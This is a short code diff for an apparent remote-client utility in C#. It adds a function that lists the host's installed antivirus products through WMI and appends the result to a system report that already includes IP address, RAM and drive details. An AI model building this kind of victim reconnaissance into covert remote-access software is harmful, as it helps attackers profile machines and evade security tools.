@@ -41,6 +41,24 @@ namespace Client.Utilities
                 return "Unkown";
             }
         }
+        private static string GetAVName()
+        {
+            try
+            {
+                StringBuilder sb = new StringBuilder();
+                ManagementObjectSearcher wmiData = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
+                ManagementObjectCollection data = wmiData.Get();
+
+                foreach (ManagementObject virusChecker in data)
+                {
+                    var virusCheckerName = virusChecker["displayName"];
+                    sb.Append(virusCheckerName + ", ");
+                }
+                return sb.ToString();
+            }
+            catch { }
+            return string.Empty;
+        }
         private static string GetTotalRam()
         {
             return Converter.FormatBytes((long)new ComputerInfo().TotalPhysicalMemory);
@@ -122,6 +140,7 @@ namespace Client.Utilities
             sb.AppendLine($"RAM : {GetTotalRam()}");
             sb.AppendLine($"Culture : {GetCulture()}");
             sb.AppendLine($"IP Addr : {GetIP()}");
+            sb.AppendLine($"Active Antivirus : {GetAVName()}");
             sb.AppendLine("==< SystemInfo Output >==");
             sb.AppendLine(RunAndGetSystemInfo());
             sb.AppendLine("==< Drive Information >==");
